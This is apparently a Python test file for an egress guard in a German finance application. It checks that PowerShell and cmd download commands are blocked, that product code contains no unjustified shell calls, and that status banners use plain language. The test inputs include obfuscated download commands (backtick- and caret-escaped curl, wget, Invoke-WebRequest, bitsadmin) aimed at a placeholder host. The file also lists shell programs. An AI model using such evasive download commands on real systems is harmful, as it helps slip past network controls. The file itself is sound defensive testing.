"""H10 Nachtrag 5: Delta-Pruefung 9d9d56ee (Dok. 86 ab Z. 11165).

N-899-15 PowerShell-Aliase und .NET-Netzwerkklassen, cmd-Escape (^) und
PowerShell-Backtick, statischer Scan auf jeden Shell-Aufruf im Produktcode
(nur mit begruendeter Ausnahme). N-899-16 Banner in Alltagssprache (Status
liefert Klartext; technische Angaben nur in der Detailansicht; Playwright in
der echten App: tests/test_e2e_h10_egress_banner_playwright.py).
"""
from __future__ import annotations

import ast
from pathlib import Path
from types import SimpleNamespace

import pytest

from services import dsg_governance as gov
from services import egress_manifest as em
from tests.h10_support import all_channel_states, api

BACKEND = Path(__file__).resolve().parents[1]
REPO = BACKEND.parent


@pytest.fixture(autouse=True)
def _guard_off():
    yield
    em.deactivate()
    em.update_channel_states(None)


def _guard():
    em.activate(SimpleNamespace(), channel_states=all_channel_states(em.load_manifest()))


# ── N-899-15 PowerShell/cmd ───────────────────────────────────────────────────

@pytest.mark.parametrize("command", [
    "iwr https://tracker.example/x -OutFile a",
    "irm https://tracker.example/api",
    "Invoke-WebRequest https://tracker.example/x",
    "Invoke-RestMethod -Uri https://tracker.example/x",
    "Start-BitsTransfer -Source https://tracker.example/x -Destination C:/t",
    "(New-Object Net.WebClient).DownloadString('https://tracker.example/x')",
    "[System.Net.Http.HttpClient]::new().GetStringAsync('https://tracker.example/x')",
    "$c = New-Object System.Net.WebClient; $c.DownloadFile('https://tracker.example/x','a')",
    "I`nvoke-W`ebRequest https://tracker.example/x",  # PowerShell-Backtick
    "c`u`r`l https://tracker.example/x",
])
def test_powershell_network_commands_are_blocked(command):
    _guard()
    with pytest.raises(em.EgressBlocked) as blocked:
        em.check_subprocess("powershell.exe", ["powershell.exe", "-NoProfile", "-Command", command])
    assert blocked.value.reason_code == "EGRESS_DESTINATION_DENIED"


@pytest.mark.parametrize("command", [
    r'C:\WINDOWS\system32\cmd.exe /c "c^u^r^l https://tracker.example/x"',
    r'C:\WINDOWS\system32\cmd.exe /c "^b^i^t^s^a^d^m^i^n /transfer j https://tracker.example/x C:\t"',
    r'cmd /c "dir & w^get https://tracker.example/x"',
])
def test_cmd_caret_escapes_are_removed_before_matching(command):
    _guard()
    with pytest.raises(em.EgressBlocked):
        em.check_subprocess(None, command)


def test_harmless_powershell_passes():
    _guard()
    em.check_subprocess("powershell.exe", ["powershell.exe", "-Command", "Get-ChildItem C:/data | Measure-Object"])


# Shell-Aufrufe im Produktcode nur mit begruendeter Ausnahme (Pfad -> Begruendung).
SHELL_CALL_EXCEPTIONS: dict[str, str] = {}

_SHELL_NAMES = {"sh", "bash", "zsh", "dash", "ksh", "cmd", "cmd.exe", "powershell", "powershell.exe", "pwsh",
                "pwsh.exe", "/bin/sh", "/bin/bash"}
_SHELL_FUNCS = {("os", "system"), ("os", "popen"), ("asyncio", "create_subprocess_shell")}
_SPAWN_FUNCS = {"run", "Popen", "call", "check_call", "check_output", "create_subprocess_exec", "spawnl",
                "spawnv", "execv", "execl", "posix_spawn"}


def _dotted(node: ast.AST) -> tuple[str, str] | None:
    if isinstance(node, ast.Attribute) and isinstance(node.value, ast.Name):
        return node.value.id, node.attr
    return None


def shell_call_offenders(root: Path) -> list[str]:
    """N-899-15: jeder Shell-Aufruf (shell=True, os.system/os.popen,
    create_subprocess_shell, Argumentliste mit Shell als Programm)."""
    found = []
    skip = {"tests", "alembic", "migrations", "venv", ".venv", "node_modules"}
    for path in root.rglob("*.py"):
        if path.relative_to(root).parts[0] in skip:
            continue
        try:
            tree = ast.parse(path.read_text(encoding="utf-8", errors="ignore"))
        except SyntaxError:
            continue
        rel = path.relative_to(root).as_posix()
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            func = _dotted(node.func)
            name = func[1] if func else (node.func.id if isinstance(node.func, ast.Name) else "")
            hit = func in _SHELL_FUNCS
            hit = hit or any(k.arg == "shell" and not (isinstance(k.value, ast.Constant) and not k.value.value)
                             for k in node.keywords)
            if not hit and name in _SPAWN_FUNCS and node.args:
                first = node.args[0]
                program = first.elts[0] if isinstance(first, (ast.List, ast.Tuple)) and first.elts else first
                hit = isinstance(program, ast.Constant) and isinstance(program.value, str) and (
                    program.value.lower() in _SHELL_NAMES or Path(program.value).name.lower() in _SHELL_NAMES)
            if hit:
                found.append(f"{rel}:{node.lineno}")
    return found


def test_every_shell_call_in_product_code_needs_a_justified_exception():
    offenders = [o for root in (BACKEND, REPO / "scripts") if root.exists() for o in shell_call_offenders(root)
                 if o.split(":")[0] not in SHELL_CALL_EXCEPTIONS]
    assert offenders == []
    assert all(reason.strip() for reason in SHELL_CALL_EXCEPTIONS.values())


def test_shell_call_scan_finds_every_form(tmp_path):
    (tmp_path / "svc").mkdir()
    (tmp_path / "svc" / "bad.py").write_text(
        "import asyncio, os, subprocess\n"
        "subprocess.run('ls', shell=True)\n"
        "os.system('ls')\n"
        "os.popen('ls')\n"
        "asyncio.create_subprocess_shell('ls')\n"
        "subprocess.run(['powershell.exe', '-Command', 'x'])\n"
        "subprocess.Popen(['/bin/sh', '-c', 'x'])\n"
        "subprocess.run(['cmd', '/c', 'dir'])\n"
        "subprocess.run(['git', 'status'], shell=False)\n", encoding="utf-8")
    assert len(shell_call_offenders(tmp_path)) == 7


# ── N-899-16 Klartext ─────────────────────────────────────────────────────────

def _blocked(cid, cls, code):
    return {"channel_id": cid, "class": cls, "reason_code": code}


def test_plain_summary_after_update_and_owner_gaps():
    lines = gov.plain_summary([
        _blocked("market_data.stooq", "market_data", "EGRESS_HASH_MISMATCH"),
        _blocked("market_data.yfinance", "market_data", "EGRESS_HASH_MISMATCH"),
        _blocked("mail.smtp", "mail", "EGRESS_HASH_MISMATCH"),
        _blocked("updates.desktop", "updates", "EGRESS_HASH_MISMATCH"),
        _blocked("telemetry.error_reporting", "telemetry", "EGRESS_GUARANTEE_MISSING"),
        _blocked("operator.backup_offsite", "operator_infrastructure", "EGRESS_DESTINATION_DENIED"),
    ])
    assert lines[0] == ("Nach dem Update muss die Datenübermittlung einmal neu freigegeben werden – Marktdaten, "
                        "E-Mail und Updates sind bis dahin pausiert.")
    assert "Für Fehlerberichte fehlen noch Angaben (Land/Garantie des Anbieters)." in lines
    assert "Für externe Datensicherung ist der Zielserver noch nicht bestätigt." in lines
    assert not any("EGRESS_" in line or "." in line.split(" ")[1] for line in lines)


def test_plain_summary_owner_gap_for_mail():
    assert gov.plain_summary([_blocked("mail.smtp", "mail", "EGRESS_GUARANTEE_MISSING")]) == [
        "Für E-Mail fehlen noch Angaben (Land/Garantie des Anbieters)."]
    assert gov.plain_summary([_blocked("mail.smtp", "mail", "EGRESS_MANIFEST_MISSING")]) == [
        "Die Datenübermittlung muss einmal freigegeben werden – E-Mail ist bis dahin pausiert."]


def test_status_carries_plain_summary_and_advisor_hint(tmp_path):
    with api(tmp_path) as (client, _current, _factory):
        status = client.get("/privacy/egress-status").json()
    assert status["plain_summary"] and status["plain_summary"][0].startswith(
        "Die Datenübermittlung muss einmal freigegeben werden – Marktdaten")
    assert status["advisor_hint"] == "Bitte Administrator informieren."
    assert all("EGRESS_" not in line for line in status["plain_summary"])
